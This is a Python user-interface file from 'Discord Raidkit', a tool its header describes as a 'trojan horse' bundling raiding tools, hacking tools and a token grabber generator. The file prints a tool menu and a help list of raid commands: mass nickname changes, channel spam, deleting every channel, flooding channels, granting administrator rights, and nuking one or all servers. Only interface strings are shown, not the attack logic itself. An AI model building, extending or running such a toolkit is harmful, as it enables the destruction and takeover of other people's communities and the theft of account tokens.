"""
Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

drui.py handles the user interfaces for the program.
drui.py was last updated on 21/04/23 at 01:37 UTC.
"""

import os

from colorama import Fore

from config import CONFIG_FILE_PATH
from utils.dr_repo_utils import MY_VERSION
from utils.io_utils import valid_input


def select_tool() -> int:
    """Select a tool to use:
    
    Anubis: 1
    Qetesh: 2
    Osiris: 3
    
    Alternatively, exit: 4."""
    s = f"""{Fore.LIGHTGREEN_EX}Discord Raidit {MY_VERSION}

{Fore.LIGHTBLUE_EX}[1] Anubis
{Fore.LIGHTRED_EX}[2] Qetesh
{Fore.LIGHTYELLOW_EX}[3] Osiris"""
    s = s + f"{Fore.MAGENTA}" if os.path.exists(CONFIG_FILE_PATH) else s + f"{Fore.LIGHTBLACK_EX}"
    s = s + f"""
[4] Edit Anubis/Qetesh Config
{Fore.RED}[5] Exit

{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}"""
    return int(valid_input(s, {'1', '2', '3', '4', '5'}, True))


def raider(prefix: str) -> str:
    """Return a string to display when the bot is ready.
    """
    return f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's raiding utility {Fore.LIGHTWHITE_EX}{MY_VERSION}{Fore.LIGHTGREEN_EX}!

{Fore.LIGHTBLUE_EX}{prefix}nick_all <nickname> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}changes the nickname of all members in the server.
{Fore.LIGHTBLUE_EX}{prefix}msg_all <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}sends a message to all members in the server.
{Fore.LIGHTBLUE_EX}{prefix}spam <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}spams a message in all channels in the server.
{Fore.LIGHTBLUE_EX}{prefix}cpurge {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}deletes all channels in the server.
{Fore.LIGHTBLUE_EX}{prefix}cflood <amount> <name> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}creates a specified amount of channels with a specified name.
{Fore.LIGHTBLUE_EX}{prefix}raid <role_name> <nickname> <amount> <name> <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}role and nick all users in a server, then run cflood and spam
{Fore.LIGHTBLUE_EX}{prefix}admin <member> <role_name> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}give a member a new role with administrator permissions.
{Fore.LIGHTBLUE_EX}{prefix}nuke {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}completely nuke a server.
{Fore.LIGHTBLUE_EX}{prefix}mass_nuke {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}completely nuke all servers the bot is in.
{Fore.LIGHTBLUE_EX}{prefix}leave <server_id> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}leave a server.
{Fore.LIGHTBLUE_EX}{prefix}mass_leave {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}leave all servers the bot is in.

{Fore.RED}Warning {Fore.LIGHTWHITE_EX}: {Fore.LIGHTRED_EX}make sure your bot's role is higher than the roles of those you wish to affect.

{Fore.LIGHTWHITE_EX}"""
